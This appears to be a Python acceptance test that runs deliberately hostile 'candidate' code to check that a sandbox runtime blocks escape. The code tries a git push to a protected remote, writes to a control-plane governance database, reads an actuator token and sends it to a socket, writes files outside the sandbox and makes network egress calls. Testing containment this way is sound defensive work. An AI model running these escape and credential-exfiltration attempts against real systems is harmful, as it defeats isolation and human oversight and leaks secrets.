"""Deliberately hostile candidate code used only by the live acceptance proof."""
from __future__ import annotations

import json
import os
import pathlib
import socket
import sqlite3
import subprocess
import tempfile
import urllib.request

PAYLOAD = "candidate-attack-4834"


def attempt_git_push() -> bool:
    with tempfile.TemporaryDirectory() as temp:
        repo = pathlib.Path(temp)
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        subprocess.run(["git", "-C", str(repo), "config", "user.name", "attacker"], check=True)
        subprocess.run(["git", "-C", str(repo), "config", "user.email", "attacker@example.invalid"], check=True)
        (repo / "owned.txt").write_text(PAYLOAD)
        subprocess.run(["git", "-C", str(repo), "add", "owned.txt"], check=True)
        subprocess.run(["git", "-C", str(repo), "commit", "-qm", "attack"], check=True)
        result = subprocess.run(
            ["git", "-C", str(repo), "push", "/capabilities/git/remote.git", "HEAD:refs/heads/candidate-attack"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )
        return result.returncode == 0


def attempt_control_plane_write() -> bool:
    try:
        db = sqlite3.connect("/capabilities/control/control.db", timeout=1)
        db.execute("INSERT INTO governance_events(actor, event) VALUES (?, ?)", ("candidate", PAYLOAD))
        db.commit()
        db.close()
        return True
    except (OSError, sqlite3.Error):
        return False


def attempt_actuator_socket_and_credential() -> bool:
    try:
        token = pathlib.Path("/capabilities/actuator/push.token").read_text().strip()
        with socket.create_connection(("actuator", 4711), timeout=1) as connection:
            connection.sendall((token + ":" + PAYLOAD).encode())
            reply = connection.recv(16)
        return reply == b"ACTUATED"
    except (OSError, socket.error):
        return False


def attempt_outside_write() -> bool:
    # Try both the canonical pinned source bind and a representative host path. The hardened
    # runtime exposes only the former, read-only; the deliberately naive runner exposes both rw.
    results = []
    for target in ("/candidate/escape.txt", "/capabilities/outside/escape.txt"):
        try:
            pathlib.Path(target).write_text(PAYLOAD)
            results.append(True)
        except OSError:
            results.append(False)
    return all(results)


def attempt_network_egress() -> bool:
    try:
        with urllib.request.urlopen("http://egress:8080/" + PAYLOAD, timeout=1) as response:
            return response.read() == b"NETWORK-OK"
    except OSError:
        return False


def test_all_candidate_attacks_are_blocked_or_naive_control_allows_them():
    results = {
        "git_push": attempt_git_push(),
        "control_plane_write": attempt_control_plane_write(),
        "actuator_socket_credential": attempt_actuator_socket_and_credential(),
        "outside_write": attempt_outside_write(),
        "network_egress": attempt_network_egress(),
    }
    expected = os.environ.get("AQ_NEGATIVE_CONTROL_EXPECT", "BLOCKED")
    rendered = {name: ("ALLOWED" if allowed else "BLOCKED") for name, allowed in results.items()}
    print("ATTACK_RESULTS=" + json.dumps(rendered, sort_keys=True))
    if expected == "ALLOWED":
        assert all(results.values()), rendered
    else:
        assert not any(results.values()), rendered
